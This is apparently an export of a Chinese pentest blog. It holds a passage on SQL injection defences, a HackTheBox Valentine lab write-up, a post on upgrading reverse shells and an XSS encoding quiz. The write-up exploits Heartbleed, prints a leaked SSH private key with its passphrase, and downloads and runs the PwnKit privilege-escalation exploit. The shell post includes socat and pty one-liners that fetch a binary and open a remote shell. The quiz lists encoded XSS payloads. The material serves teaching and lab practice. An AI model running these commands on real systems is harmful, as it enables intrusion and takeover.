使用参数绑定或预编译语句：使用参数化查询或预编译语句，将用户提供的输入作为参数传递给SQL查询，而不是将其直接拼接到查询字符串中。这样可以防止恶意输入被解释为SQL代码。 输入验证和过滤：对于动态生成的列名或表达式，确保对用户输入进行严格的验证和过滤，只允许合法的值和字符，避免将恶意输入传递给SQL查询。 最小权限原则：在数据库的访问控制上，确保应用程序使用的数据库账户具有最小的权限，仅限于执行必要的操作，以减少潜在的攻击面。 对于无法直接进行预编译的内容，需要在代码层进行过滤和处理，比如可以通过映射的方式将前端接收的参数值匹配到后端相应的值，再传入SQL进行操作，从而避免将恶意输入传递给SQL查询。 以上就是本次分享全部内容，如有纰漏，欢迎各位大佬交流指正。 微信扫一扫，关注该公众号 ","date":"2023-07-27","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/:3:0","tags":["SQLi"],"title":"018-SQL注入之GroupBy位置点注入","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/"},{"categories":["靶场"],"content":"012-Valentine 靶机IP：10.10.10.79 ","date":"2023-05-01","objectID":"/posts/hackthebox-valentine/:1:0","tags":["HTB","OSCP"],"title":"HTB靶机 012 Valentine WriteUp","uri":"/posts/hackthebox-valentine/"},{"categories":["靶场"],"content":"Scan nmap端口扫描： ┌──(xavier㉿kali)-[~] └─$ sudo nmap -sSV -T4 10.10.10.79 -F Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-29 00:47 CST Nmap scan report for 10.10.10.79 Host is up (0.30s latency). Not shown: 97 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.2.22 ((Ubuntu)) 443/tcp open ssl/http Apache httpd 2.2.22 ((Ubuntu)) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 28.88 seconds 访问80、443端口都是如下一张图片： 通过图片联想到心脏滴血漏洞，使用nmap进行探测 ┌──(xavier㉿kali)-[~] └─$ ls /usr/share/nmap/scripts | grep ssl rmi-vuln-classloader.nse ssl-ccs-injection.nse ssl-cert-intaddr.nse ssl-cert.nse ssl-date.nse ssl-dh-params.nse ssl-enum-ciphers.nse ssl-heartbleed.nse ssl-known-key.nse ssl-poodle.nse sslv2-drown.nse sslv2.nse ┌──(xavier㉿kali)-[~] └─$ sudo nmap -sSV -T4 10.10.10.79 -p22,443 --script ssl-heartbleed.nse Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-29 00:54 CST Nmap scan report for 10.10.10.79 Host is up (0.32s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0) 443/tcp open ssl/http Apache httpd 2.2.22 ((Ubuntu)) |_http-server-header: Apache/2.2.22 (Ubuntu) | ssl-heartbleed: | VULNERABLE: | The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption. | State: VULNERABLE | Risk factor: High | OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves. | | References: | http://cvedetails.com/cve/2014-0160/ | http://www.openssl.org/news/secadv_20140407.txt |_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 22.19 seconds 探测结果说明心脏滴血漏洞存在。 之后先针对心脏滴血漏洞进行利用，同时扫描全端口，看看有没有忽略的信息 ┌──(xavier㉿kali)-[~] └─$ sudo nmap -sSV -T4 10.10.10.79 -p- Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-29 15:24 CST Nmap scan report for 10.10.10.79 Host is up (0.25s latency). Not shown: 65525 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.2.22 ((Ubuntu)) 443/tcp open ssl/http Apache httpd 2.2.22 ((Ubuntu)) 1983/tcp filtered lhtp 2028/tcp filtered submitserver 19156/tcp filtered unknown 20316/tcp filtered unknown 28245/tcp filtered unknown 50399/tcp filtered unknown 55915/tcp filtered unknown Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 1181.61 seconds 使用-sC 对相应端口进行扫描，发现无新增结果，就不写细节了。 ","date":"2023-05-01","objectID":"/posts/hackthebox-valentine/:2:0","tags":["HTB","OSCP"],"title":"HTB靶机 012 Valentine WriteUp","uri":"/posts/hackthebox-valentine/"},{"categories":["靶场"],"content":"Heartbleed ","date":"2023-05-01","objectID":"/posts/hackthebox-valentine/:3:0","tags":["HTB","OSCP"],"title":"HTB靶机 012 Valentine WriteUp","uri":"/posts/hackthebox-valentine/"},{"categories":["靶场"],"content":"MSF 利用MSF进行漏洞利用 ┌──(xavier㉿kali)-[~] └─$ msfconsole msf6 \u003e search heartbleed Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/server/openssl_heartbeat_client_memory 2014-04-07 normal No OpenSSL Heartbeat (Heartbleed) Client Memory Exposure 1 auxiliary/scanner/ssl/openssl_heartbleed 2014-04-07 normal Yes OpenSSL Heartbeat (Heartbleed) Information Leak Interact with a module by name or index. For example info 1, use 1 or use auxiliary/scanner/ssl/openssl_heartbleed msf6 \u003e use auxiliary/scanner/ssl/openssl_heartbleed msf6 auxiliary(scanner/ssl/openssl_heartbleed) \u003e set RHOSTS 10.10.10.79 RHOSTS =\u003e 10.10.10.79 msf6 auxiliary(scanner/ssl/openssl_heartbleed) \u003e run [+] 10.10.10.79:443 - Heartbeat response with leak, 65535 bytes [*] 10.10.10.79:443 - Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed msf6 auxiliary(scanner/ssl/openssl_heartbleed) \u003e set VERBOSE True VERBOSE =\u003e true msf6 auxiliary(scanner/ssl/openssl_heartbleed) \u003e exploit [*] 10.10.10.79:443 - Leaking heartbeat response #1 [*] 10.10.10.79:443 - Sending Client Hello... [*] 10.10.10.79:443 - SSL record #1: 心脏滴血是一个信息泄露漏洞，每次泄露的信息并不一样，所以需要多执行几次。 ","date":"2023-05-01","objectID":"/posts/hackthebox-valentine/:3:1","tags":["HTB","OSCP"],"title":"HTB靶机 012 Valentine WriteUp","uri":"/posts/hackthebox-valentine/"},{"categories":["靶场"],"content":"非MSF 搜索EXP： ┌──(xavier㉿kali)-[~/Desktop/HTB/012-Valentine] └─$ searchsploit heartbleed --------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path --------------------------------------------------------------------------------------------------------- --------------------------------- OpenSSL 1.0.1f TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure (Multiple SSL/TLS Versions) | multiple/remote/32764.py OpenSSL TLS Heartbeat Extension - 'Heartbleed' Information Leak (1) | multiple/remote/32791.c OpenSSL TLS Heartbeat Extension - 'Heartbleed' Information Leak (2) (DTLS Support) | multiple/remote/32998.c OpenSSL TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure | multiple/remote/32745.py --------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results 找个利用脚本进行利用 ┌──(xavier㉿kali)-[~/Desktop/HTB/012-Valentine] └─$ searchsploit -m multiple/remote/32764.py Exploit: OpenSSL 1.0.1f TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure (Multiple SSL/TLS Versions) URL: https://www.exploit-db.com/exploits/32764 Path: /usr/share/exploitdb/exploits/multiple/remote/32764.py Codes: CVE-2014-0346, CVE-2014-0160, OSVDB-105465 Verified: True File Type: Python script, ASCII text executable Copied to: /home/xavier/Desktop/HTB/012-Valentine/32764.py ┌──(xavier㉿kali)-[~/Desktop/HTB/012-Valentine] └─$ python2 32764.py -h Usage: 32764.py server [options] Test for SSL heartbeat vulnerability (CVE-2014-0160) Options: -h, --help show this help message and exit -p PORT, --port=PORT TCP port to test (default: 443) 漏洞利用： ┌──(xavier㉿kali)-[~/Desktop/HTB/012-Valentine] └─$ python2 32764.py 10.10.10.79 Trying SSL 3.0... Connecting... Sending Client Hello... Waiting for Server Hello... ... received message: type = 22, ver = 0300, length = 94 ... received message: type = 22, ver = 0300, length = 885 ... received message: type = 22, ver = 0300, length = 331 ... received message: type = 22, ver = 0300, length = 4 Sending heartbeat request... ... received message: type = 24, ver = 0300, length = 16384 Received heartbeat response: 0000: 02 40 00 D8 03 00 53 43 5B 90 9D 9B 72 0B BC 0C .@....SC[...r... 0010: BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90 .+..H...9....... 0020: 9F 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0 .w.3....f.....\". 0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00 !.9.8.........5. 同样，因为信息泄露的不确定性，我们需要多执行几次，以发现所期望的敏感信息。 执行了多次后，发现泄露了如下信息： 0.0.1/decode.php..Content-Type: application/x-www-form-urlencoded..Content-Length: 42....$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==. 对$text的值aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==进行base64解密 ┌──(xavier㉿kali)-[~] └─$ echo \"aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==\" | base64 -d heartbleedbelievethehype ","date":"2023-05-01","objectID":"/posts/hackthebox-valentine/:3:2","tags":["HTB","OSCP"],"title":"HTB靶机 012 Valentine WriteUp","uri":"/posts/hackthebox-valentine/"},{"categories":["靶场"],"content":"Web扫描 这边decode.php也提示我忘了一个环节：对Web路径的探测，这里补一下 ┌──(xavier㉿kali)-[~] └─$ dirsearch -e php,html,txt -t 100 -u https://10.10.10.79/ Target: https://10.10.10.79/ [16:14:19] Starting: [16:15:27] 301 - 310B - /dev -\u003e https://10.10.10.79/dev/ [16:15:27] 200 - 1KB - /dev/ [16:15:39] 200 - 38B - /index.php 访问dev目录如下： 查看notes.txt To do: 1) Coffee. 2) Research. 3) Fix decoder/encoder before going live. 4) Make sure encoding/decoding is only done client-side. 5) Don't use the decoder/encoder until any of this is done. 6) Find a better way to take notes. 查看hype_key： 下载hype_key $ wget https://10.10.10.79/dev/hype_key --no-check-certificate 然后通过xxd 对十六进制进行转换： ┌──(xavier㉿kali)-[~/Desktop/HTB/012-Valentine] └─$ xxd -r -p hype_key -----BEGIN RSA PRIVATE KEY----- Proc-Type: 4,ENCRYPTED DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46 DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R 5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6 0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5 XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ +wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe 2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP 09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3 -----END RSA PRIVATE KEY----- 可以看到是一个RSA私钥，接下去用ssh进行连接 ","date":"2023-05-01","objectID":"/posts/hackthebox-valentine/:4:0","tags":["HTB","OSCP"],"title":"HTB靶机 012 Valentine WriteUp","uri":"/posts/hackthebox-valentine/"},{"categories":["靶场"],"content":"初始shell 对hype_key进行转码，并通过ssh进行连接 ┌──(xavier㉿kali)-[~/Desktop/HTB/012-Valentine] └─$ xxd -r -p hype_key \u003e hype_key.rsa ┌──(xavier㉿kali)-[~/Desktop/HTB/012-Valentine] └─$ chmod 600 hype_key.rsa ┌──(xavier㉿kali)-[~/Desktop/HTB/012-Valentine] └─$ ssh -i hype_key.rsa hype@10.10.10.79 Enter passphrase for key 'hype_key.rsa': 这里私钥有密码，想到了之前decode中获取的字符串：heartbleedbelievethehype ┌──(xavier㉿kali)-[~/Desktop/HTB/012-Valentine] └─$ ssh -i hype_key.rsa hype@10.10.10.79 Enter passphrase for key 'hype_key.rsa': sign_and_send_pubkey: no mutual signature supported hype@10.10.10.79's password: 这里有个报错，因为新版本的ssh不再支持一些弱加密算法，所以如果要用的话需要手动指定-o PubkeyAcceptedKeyTypes=+ssh-rsa。 ┌──(xavier㉿kali)-[~/Desktop/HTB/012-Valentine] └─$ ssh -i hype_key.rsa hype@10.10.10.79 -o PubkeyAcceptedKeyTypes=+ssh-rsa Enter passphrase for key 'hype_key.rsa': Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64) * Documentation: https://help.ubuntu.com/ New release '14.04.5 LTS' available. Run 'do-release-upgrade' to upgrade to it. Last login: Fri Feb 16 14:50:29 2018 from 10.10.14.3 hype@Valentine:~$ id uid=1000(hype) gid=1000(hype) groups=1000(hype),24(cdrom),30(dip),46(plugdev),124(sambashare) hype@Valentine:~$ 这里也可以修改SSH配置文件，在文件末尾追加以下内容 Host * PubkeyAcceptedKeyTypes=+ssh-rsa HostKeyAlgorithms=+ssh-rsa ","date":"2023-05-01","objectID":"/posts/hackthebox-valentine/:5:0","tags":["HTB","OSCP"],"title":"HTB靶机 012 Valentine WriteUp","uri":"/posts/hackthebox-valentine/"},{"categories":["靶场"],"content":"root shell 上传linpeas.sh进行信息搜集，利用Python和wget进行上传 # kali ┌──(xavier㉿kali)-[~/Desktop/HTB/tools] └─$ python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.10.10.79 - - [29/Apr/2023 17:10:53] \"GET /linpeas.sh HTTP/1.1\" 200 - # Victim hype@Valentine:/tmp$ wget http://10.10.14.22/linpeas.sh hype@Valentine:/tmp$ chmod +x linpeas.sh hype@Valentine:/tmp$ ./linpeas.sh \u003e result.txt 利用同样的方式，再把result.txt下载到本地 ","date":"2023-05-01","objectID":"/posts/hackthebox-valentine/:6:0","tags":["HTB","OSCP"],"title":"HTB靶机 012 Valentine WriteUp","uri":"/posts/hackthebox-valentine/"},{"categories":["靶场"],"content":"CVE-2021-4034 查看result.txt，发现系统存在sudo CVE-2021-4034漏洞，可利用该漏洞提权。 hype@Valentine:/tmp$ wget http://10.10.14.22/PwnKit hype@Valentine:/tmp$ chmod +x PwnKit hype@Valentine:/tmp$ ./PwnKit root@Valentine:/tmp# id uid=0(root) gid=0(root) groups=0(root),24(cdrom),30(dip),46(plugdev),124(sambashare),1000(hype) root@Valentine:/tmp# root@Valentine:/tmp# cat /root/root.txt adf6f323296f600cec9294d64c6c9bc1 root@Valentine:/tmp# cat /home/hype/user.txt 0b946d1f7c12bb371585d67c10557dc8 ","date":"2023-05-01","objectID":"/posts/hackthebox-valentine/:6:1","tags":["HTB","OSCP"],"title":"HTB靶机 012 Valentine WriteUp","uri":"/posts/hackthebox-valentine/"},{"categories":["靶场"],"content":"tmux提权 查看result.txt，发现tmux session 通过tmux进行提权，成功获取root权限： hype@Valentine:/tmp$ tmux -S /.devs/dev_sess root@Valentine:/tmp# id uid=0(root) gid=0(root) groups=0(root) root@Valentine:/tmp# ","date":"2023-05-01","objectID":"/posts/hackthebox-valentine/:6:2","tags":["HTB","OSCP"],"title":"HTB靶机 012 Valentine WriteUp","uri":"/posts/hackthebox-valentine/"},{"categories":["靶场"],"content":"END ","date":"2023-05-01","objectID":"/posts/hackthebox-valentine/:7:0","tags":["HTB","OSCP"],"title":"HTB靶机 012 Valentine WriteUp","uri":"/posts/hackthebox-valentine/"},{"categories":["Pentest"],"content":"nc得到的反弹shell是一个功能非常有限的 shell，本文记录从反弹shell到TTY Shell的一些方法","date":"2023-04-25","objectID":"/posts/20230425-shellspawn/","tags":["Pentest","RedTeam"],"title":"Shell Spawning","uri":"/posts/20230425-shellspawn/"},{"categories":["Pentest"],"content":"Shell-Spawning（反弹shell到TTYShell） 当我们在 linux 机器上获得了一个 shell，这个 shell 可能没有 TTY（终端连接）功能，导致无法执行一些命令，例如切换用户的“su”命令或“nano”文件创建和修改工具。 同样，渗透测试中也有很多重要功能无法在没有TTY功能的shell 上运行。为了继续进行渗透测试，你将需要生成 TTY shell。 通常，在通过 nc 捕获 shell 之后，会在一个功能非常有限的 shell 中。例如没有命令历史记录（并使用向上“”和“向下”箭头循环浏览它们）和文件名称、命令补全等。在缺少这些功能的 shell 中查询或操作会比较麻烦。 注意：要检查 shell 是否是 TTY shell，请使用 tty 命令。 以下为非TTY shell中生成TTY shell的实用命令。 ","date":"2023-04-25","objectID":"/posts/20230425-shellspawn/:1:0","tags":["Pentest","RedTeam"],"title":"Shell Spawning","uri":"/posts/20230425-shellspawn/"},{"categories":["Pentest"],"content":"1、Basic commands ","date":"2023-04-25","objectID":"/posts/20230425-shellspawn/:2:0","tags":["Pentest","RedTeam"],"title":"Shell Spawning","uri":"/posts/20230425-shellspawn/"},{"categories":["Pentest"],"content":"基于Python: python -c 'import pty; pty.spawn(\"/bin/sh\")' python3 -c 'import pty; pty.spawn(\"/bin/sh\")' 首先连接到 shell 后，先检查一下 python 的可用性， 用 winch 命令检查： which python python2 python3 只要安装了其中任何一个，就将返回已安装二进制文件的路径。 在靶机上输入以下命令（使用机器上可用的 python 版本！） python3 -c 'import pty;pty.spawn(\"/bin/bash\")'; 接下来，在靶机上输入以下命令来设置一些重要的环境变量： export SHELL=bash export TERM=\"xterm-256color\" #允许 clear，并且有颜色 export TERM=\"screen-256color\" # TERM任选其一 键入 ctrl-z 以将 shell 发送到后台。 设置 shell 以通过反向 shell 发送控制字符和其他原始输入。使用以下stty命令来执行此操作。 stty raw -echo;fg 回车一次后 输入 reset 再回车 将再次进入 shell 中。 到此 TTY shell 升级完成。 ","date":"2023-04-25","objectID":"/posts/20230425-shellspawn/:2:1","tags":["Pentest","RedTeam"],"title":"Shell Spawning","uri":"/posts/20230425-shellspawn/"},{"categories":["Pentest"],"content":"其他命令： echo os.system('/bin/bash') /bin/sh -i #python3 python3 -c 'import pty; pty.spawn(\"/bin/sh\")' #perl exec \"/bin/sh\"; perl -e 'exec \"/bin/sh\";' #ruby exec \"/bin/sh\" ruby -e 'exec \"/bin/sh\"' #lua lua -e \"os.execute('/bin/sh')\" ","date":"2023-04-25","objectID":"/posts/20230425-shellspawn/:2:2","tags":["Pentest","RedTeam"],"title":"Shell Spawning","uri":"/posts/20230425-shellspawn/"},{"categories":["Pentest"],"content":"2、nmap nmap版本 \u003c=5.21. nmap --interactive !sh 这可以实现一个TTY交互shell，如果nmap还具备SUID权限，那么还可以实现权限提升的效果。 ","date":"2023-04-25","objectID":"/posts/20230425-shellspawn/:3:0","tags":["Pentest","RedTeam"],"title":"Shell Spawning","uri":"/posts/20230425-shellspawn/"},{"categories":["Pentest"],"content":"3、vi/vim vi/vim 是一个可以在非TTY shell中运行的文本编辑器。 :!bash 或 :set shell=/bin/bash :shell ","date":"2023-04-25","objectID":"/posts/20230425-shellspawn/:4:0","tags":["Pentest","RedTeam"],"title":"Shell Spawning","uri":"/posts/20230425-shellspawn/"},{"categories":["Pentest"],"content":"4、STTY “stty”命令允许您更改终端与系统的连接特性。 例如，使用 -a 选项获取当前配置： stty -a 使用“stty”生成shell，步骤如下： In victim machine reverse shell $ python -c 'import pty; pty.spawn(\"/bin/bash\")' Ctrl-Z In Attacker console # echo $TERM # stty -a # stty raw -echo # fg [enter] [enter] In reverse shell $ reset $ export SHELL=bash $ export TERM=xterm-256color $ stty rows \u003cnum\u003e columns \u003ccols\u003e ","date":"2023-04-25","objectID":"/posts/20230425-shellspawn/:5:0","tags":["Pentest","RedTeam"],"title":"Shell Spawning","uri":"/posts/20230425-shellspawn/"},{"categories":["Pentest"],"content":"5、IRB (From within IRB) - exec \"/bin/sh\" ","date":"2023-04-25","objectID":"/posts/20230425-shellspawn/:6:0","tags":["Pentest","RedTeam"],"title":"Shell Spawning","uri":"/posts/20230425-shellspawn/"},{"categories":["Pentest"],"content":"5、rlwrap 可以通过使用 rlwrap 命令包装 nc 侦听器来减轻对 shell 的一些限制。默认情况下不会安装它，需要使用 sudo apt rlwrap 或 apt-get install rlwrap 安装。 $ rlwrap nc -lvnp $port ","date":"2023-04-25","objectID":"/posts/20230425-shellspawn/:7:0","tags":["Pentest","RedTeam"],"title":"Shell Spawning","uri":"/posts/20230425-shellspawn/"},{"categories":["Pentest"],"content":"6、socat 另一种方法是将 socat 二进制文件上传到靶机并获得一个完全交互式的 shell。从 https://github.com/andrew-d/static-binaries 下载适当的二进制文件。Socat 需要在两台机器上才能工作。 #在本地监听：: socat file:`tty`,raw,echo=0 tcp-listen:4444 #靶机: socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.11.100:1234 如果在命令注入的地方注入反弹 shell，获得即时完全交互式的反向 shell： wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /dev/shm/socat; chmod +x /dev/shm/socat; /dev/shm/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.11.100:1234 如果靶机访问不了互联网，就先把 socat 文件下载下来，开启 http 服务，然后将上面的路径指向你的本地地址。 ","date":"2023-04-25","objectID":"/posts/20230425-shellspawn/:8:0","tags":["Pentest","RedTeam"],"title":"Shell Spawning","uri":"/posts/20230425-shellspawn/"},{"categories":["Pentest"],"content":"参考文章 https://www.cnblogs.com/sainet/p/15783539.html https://rcenetsec.com/shell-spawning/ ","date":"2023-04-25","objectID":"/posts/20230425-shellspawn/:9:0","tags":["Pentest","RedTeam"],"title":"Shell Spawning","uri":"/posts/20230425-shellspawn/"},{"categories":["Pentest"],"content":"一、小测验 本文介绍浏览器加载过程以及常用的XSS编码解析原理。首发于T00ls论坛，在博客中再发一遍留档。 首先做个小测试，下面的XSS payload能否触发，题目选自大佬博客。 ","date":"2023-03-30","objectID":"/posts/2023-6-%E6%B5%8F%E8%A7%88%E5%99%A8xss%E7%BC%96%E7%A0%81%E8%A7%A3%E6%9E%90%E5%8E%9F%E7%90%86/:1:0","tags":["Pentest","XSS"],"title":"浏览器XSS编码解析原理","uri":"/posts/2023-6-%E6%B5%8F%E8%A7%88%E5%99%A8xss%E7%BC%96%E7%A0%81%E8%A7%A3%E6%9E%90%E5%8E%9F%E7%90%86/"},{"categories":["Pentest"],"content":"问题 基础题： 1.URL编码\"javascript:alert(1)\" \u003ca href=\"%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29\"\u003e\u003c/a\u003e 2.实体编码\"javascript\"，URL编码\"alert(2)\" \u003ca href=\"\u0026#x6a;\u0026#x61;\u0026#x76;\u0026#x61;\u0026#x73;\u0026#x63;\u0026#x72;\u0026#x69;\u0026#x70;\u0026#x74;:%61 %6c%65%72%74%28%32%29\"\u003e 3.URL编码\":\" \u003ca href=\"javascript%3aalert(3)\"\u003e\u003c/a\u003e 4.实体编码\u003c \u003e \u003cdiv\u003e\u0026#60;img src=x onerror=alert(4)\u0026#62;\u003c/div\u003e 5.实体编码\u003c \u003e \u003ctextarea\u003e\u0026#60;script\u0026#62;alert(5)\u0026#60;/script\u0026#62;\u003c/textarea\u003e 6. \u003ctextarea\u003e\u003cscript\u003ealert(6)\u003c/script\u003e\u003c/textarea\u003e 高级题： 7.实体编码' \u003cbutton onclick=\"confirm('7\u0026#39;);\"\u003eButton\u003c/button\u003e 8.Unicode编码' \u003cbutton onclick=\"confirm('8\\u0027);\"\u003eButton\u003c/button\u003e 9.实体编码alert(9); \u003cscript\u003e\u0026#97;\u0026#108;\u0026#101;\u0026#114;\u0026#116\u0026#40;\u0026#57;\u0026#41;\u0026#59\u003c/script\u003e 10.Unicode编码alert \u003cscript\u003e\\u0061\\u006c\\u0065\\u0072\\u0074(10);\u003c/script\u003e 11.unicode编码alert(11) \u003cscript\u003e\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0031\\u0029\u003c/script\u003e 12.Unicode编码alert和12 \u003cscript\u003e\\u0061\\u006c\\u0065\\u0072\\u0074(\\u0031\\u0032)\u003c/script\u003e 13.Unicode编码' \u003cscript\u003ealert('13\\u0027)\u003c/script\u003e 14.Unicode编码换行符 \u003cscript\u003ealert('14\\u000a')\u003c/script\u003e 附加题： \u003ca href=\"\u0026#x6a;\u0026#x61;\u0026#x76;\u0026#x61;\u0026#x73;\u0026#x63;\u0026#x72;\u0026#x69;\u0026#x70;\u0026#x74;\u0026#x3a;\u0026#x25;\u0026#x35;\u0026#x63;\u0026#x25;\u0026#x37;\u0026#x35;\u0026#x25;\u0026#x33;\u0026#x30;\u0026#x25;\u0026#x33;\u0026#x30;\u0026#x25;\u0026#x33;\u0026#x36;\u0026#x25;\u0026#x33;\u0026#x31;\u0026#x25;\u0026#x35;\u0026#x63;\u0026#x25;\u0026#x37;\u0026#x35;\u0026#x25;\u0026#x33;\u0026#x30;\u0026#x25;\u0026#x33;\u0026#x30;\u0026#x25;\u0026#x33;\u0026#x36;\u0026#x25;\u0026#x36;\u0026#x33;\u0026#x25;\u0026#x35;\u0026#x63;\u0026#x25;\u0026#x37;\u0026#x35;\u0026#x25;\u0026#x33;\u0026#x30;\u0026#x25;\u0026#x33;\u0026#x30;\u0026#x25;\u0026#x33;\u0026#x36;\u0026#x25;\u0026#x33;\u0026#x35;\u0026#x25;\u0026#x35;\u0026#x63;\u0026#x25;\u0026#x37;\u0026#x35;\u0026#x25;\u0026#x33;\u0026#x30;\u0026#x25;\u0026#x33;\u0026#x30;\u0026#x25;\u0026#x33;\u0026#x37;\u0026#x25;\u0026#x33;\u0026#x32;\u0026#x25;\u0026#x35;\u0026#x63;\u0026#x25;\u0026#x37;\u0026#x35;\u0026#x25;\u0026#x33;\u0026#x30;\u0026#x25;\u0026#x33;\u0026#x30;\u0026#x25;\u0026#x33;\u0026#x37;\u0026#x25;\u0026#x33;\u0026#x34;\u0026#x28;\u0026#x31;\u0026#x35;\u0026#x29;\"\u003e\u003c/a\u003e ","date":"2023-03-30","objectID":"/posts/2023-6-%E6%B5%8F%E8%A7%88%E5%99%A8xss%E7%BC%96%E7%A0%81%E8%A7%A3%E6%9E%90%E5%8E%9F%E7%90%86/:1:1","tags":["Pentest","XSS"],"title":"浏览器XSS编码解析原理","uri":"/posts/2023-6-%E6%B5%8F%E8%A7%88%E5%99%A8xss%E7%BC%96%E7%A0%81%E8%A7%A3%E6%9E%90%E5%8E%9F%E7%90%86/"},{"categories":["Pentest"],"content":"答案 The answers to these questions are here and the testing page is here. 具体内容可以去大佬博客看，我这就写个结果，Y表示触发，N表示不触发 1N，2Y，3N，4N，5N，6N 7Y，8N，9N，10Y，11N，12N，13N，14Y 15Y 